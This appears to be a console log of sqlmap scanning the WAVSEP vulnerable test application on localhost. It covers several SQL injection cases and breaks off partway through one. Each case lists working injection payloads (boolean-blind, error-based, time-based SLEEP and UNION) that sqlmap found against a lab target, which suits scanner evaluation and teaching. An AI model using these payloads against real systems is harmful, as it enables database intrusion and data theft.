GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[05:04:46] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp?minBalanace=10000'                                                                                                           
[05:04:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=1883A36449E...97D9B94D47'). Do you want to use those [Y/n] Y
[05:04:46] [INFO] testing if GET parameter 'minBalanace' is dynamic
[05:04:46] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[05:04:46] [INFO] heuristic (basic) test shows that GET parameter 'minBalanace' might be injectable (possible DBMS: 'MySQL')
[05:04:46] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[05:04:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:04:46] [WARNING] reflective value(s) found and filtering out
[05:04:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:04:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:04:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:04:48] [INFO] GET parameter 'minBalanace' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:04:48] [INFO] testing 'Generic inline queries'
[05:04:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:04:48] [INFO] GET parameter 'minBalanace' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:04:48] [INFO] testing 'MySQL inline queries'
[05:04:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:04:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:04:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:04:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:04:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:04:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:04:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:58] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:04:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:04:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:04:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:04:58] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[05:04:58] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:04:58] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:04:58] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:04:58] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:04:58] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:04:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:04:58] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:04:58] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:04:58] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:04:59] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 723 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: minBalanace=10000 AND 9799=(SELECT (CASE WHEN (9799=9799) THEN 9799 ELSE (SELECT 7148 UNION SELECT 4824) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: minBalanace=10000 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a7a6271,(SELECT (ELT(1533=1533,1))),0x71766b6a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 1530 FROM (SELECT(SLEEP(5)))eFIX)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:04:59] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:04:59] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 695 times
[56/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[05:04:59] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp?msgid=1'                                                                                                                 
[05:04:59] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=F39890467DA...A65F954592'). Do you want to use those [Y/n] Y
[05:04:59] [INFO] testing if GET parameter 'msgid' is dynamic
[05:04:59] [WARNING] GET parameter 'msgid' does not appear to be dynamic
[05:05:00] [INFO] heuristic (basic) test shows that GET parameter 'msgid' might be injectable (possible DBMS: 'MySQL')
[05:05:00] [INFO] testing for SQL injection on GET parameter 'msgid'
[05:05:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:05:00] [WARNING] reflective value(s) found and filtering out
[05:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:05:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:05:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:05:01] [INFO] GET parameter 'msgid' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:05:01] [INFO] testing 'Generic inline queries'
[05:05:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:05:01] [INFO] GET parameter 'msgid' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:05:01] [INFO] testing 'MySQL inline queries'
[05:05:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:05:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:05:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:05:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:05:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:05:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:05:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:05:11] [INFO] GET parameter 'msgid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:05:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:05:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:05:11] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:05:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:05:11] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:05:12] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:05:12] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:05:12] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:05:12] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:05:12] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:05:12] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:05:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:05:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:05:12] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:05:13] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'msgid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 713 HTTP(s) requests:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgid=1 AND 7053=(SELECT (CASE WHEN (7053=7053) THEN 7053 ELSE (SELECT 9410 UNION SELECT 1972) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgid=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176787871,(SELECT (ELT(6525=6525,1))),0x716a627a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgid=1 AND (SELECT 6610 FROM (SELECT(SLEEP(5)))ChGF)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:05:13] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:05:13] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 697 times
[57/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=1
do you want to test this URL? [Y/n/q]
> Y
[05:05:13] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=1'                                                                                            
[05:05:13] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=C588CB10071...A03612810A'). Do you want to use those [Y/n] Y
[05:05:13] [INFO] testing if GET parameter 'orderby' is dynamic
[05:05:13] [WARNING] GET parameter 'orderby' does not appear to be dynamic
[05:05:13] [INFO] heuristic (basic) test shows that GET parameter 'orderby' might be injectable (possible DBMS: 'MySQL')
[05:05:13] [INFO] testing for SQL injection on GET parameter 'orderby'
[05:05:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:05:14] [WARNING] reflective value(s) found and filtering out
[05:05:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:05:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:05:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:05:15] [INFO] GET parameter 'orderby' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:05:15] [INFO] testing 'Generic inline queries'
[05:05:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:05:15] [INFO] GET parameter 'orderby' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:05:15] [INFO] testing 'MySQL inline queries'
[05:05:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:05:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:05:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:05:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:05:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:05:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:05:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:05:25] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:05:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:05:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:05:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:05:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:05:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:05:25] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:05:25] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:05:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:05:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[05:05:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[05:05:26] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[05:05:26] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[05:05:27] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 717 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: orderby=1 AND 3352=(SELECT (CASE WHEN (3352=3352) THEN 3352 ELSE (SELECT 3397 UNION SELECT 6371) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: orderby=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b717671,(SELECT (ELT(5397=5397,1))),0x7176717a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=1 AND (SELECT 8415 FROM (SELECT(SLEEP(5)))IRfb)
---
do you want to exploit this SQL injection? [Y/n] Y
[05:05:27] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:05:27] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 702 times
[58/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[05:05:27] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp?transactionDate=2010-01-01'                                                                                                   
[05:05:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=3C9DE9A9464...E527811C15'). Do you want to use those [Y/n] Y
[05:05:27] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:05:27] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:05:27] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[05:05:27] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:05:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:05:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:05:27] [WARNING] reflective value(s) found and filtering out
[05:05:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:05:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:05:28] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:05:28] [INFO] testing 'Generic inline queries'
[05:05:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:05:28] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:05:28] [INFO] testing 'MySQL inline queries'
[05:05:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:05:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:05:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:05:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:05:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:05:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:05:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:05:38] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:05:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:05:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:05:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:05:38] [INFO] target URL appears to have 4 columns in query
[05:05:38] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 326 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-01-01' AND 4424=(SELECT (CASE WHEN (4424=4424) THEN 4424 ELSE (SELECT 7767 UNION SELECT 4619) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(3143=3143,1))),0x717a627671,0x78))s), 8446744073709551610, 8446744073709551610)))-- XzHr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 1154 FROM (SELECT(SLEEP(5)))Zfmw)-- XnDH

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,NULL,CONCAT(0x7171767871,0x744e694c44784f616264496664554662574e79464d494a6a5562476b677175486676795470786766,0x717a627671),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:05:38] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:05:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 97 times
[59/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[05:05:38] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp?transactionDate=2010-01-01'                                                                                                     
[05:05:38] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=BBA7A51B910...14CB995E8A'). Do you want to use those [Y/n] Y
[05:05:38] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:05:38] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:05:38] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[05:05:38] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:05:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:05:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:05:39] [WARNING] reflective value(s) found and filtering out
[05:05:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:05:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:05:40] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:05:40] [INFO] testing 'Generic inline queries'
[05:05:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:05:40] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:05:40] [INFO] testing 'MySQL inline queries'
[05:05:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:05:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:05:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:05:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:05:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:05:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:05:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:05:50] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:05:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:05:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:05:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:05:50] [INFO] target URL appears to have 4 columns in query
[05:05:50] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[05:05:50] [WARNING] automatically patching output having last char trimmed
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 327 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-01-01' AND 4313=(SELECT (CASE WHEN (4313=4313) THEN 4313 ELSE (SELECT 1384 UNION SELECT 1541) END))-- -

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b787071,(SELECT (ELT(6987=6987,1))),0x7170767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- rooE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 3608 FROM (SELECT(SLEEP(5)))sThQ)-- ture

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b787071,0x6d465278766f5343775a51424a6353634f4f76556157424a6f43777077446b46784561667662696b,0x7170767a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[05:05:50] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[05:05:50] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 104 times
[60/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[05:05:50] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp?transactionDate=2010-01-01'                                                                                                     
[05:05:50] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=D7D9EC550AA...95F22803C6'). Do you want to use those [Y/n] Y
[05:05:50] [INFO] testing if GET parameter 'transactionDate' is dynamic
[05:05:50] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[05:05:50] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[05:05:50] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[05:05:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:05:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:05:51] [WARNING] reflective value(s) found and filtering out
[05:05:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:05:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:05:51] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[05:05:51] [INFO] testing 'Generic inline queries'
[05:05:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:05:51] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[05:05:51] [INFO] testing 'MySQL inline queries'
[05:05:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:05:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:05:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:05:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:05:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:05:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:05:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:01] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:01] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:06:01] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[05:06:02] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:06:02] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:06:02] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:06:02] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:06:02] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[05:06:02] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[05:06:02] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
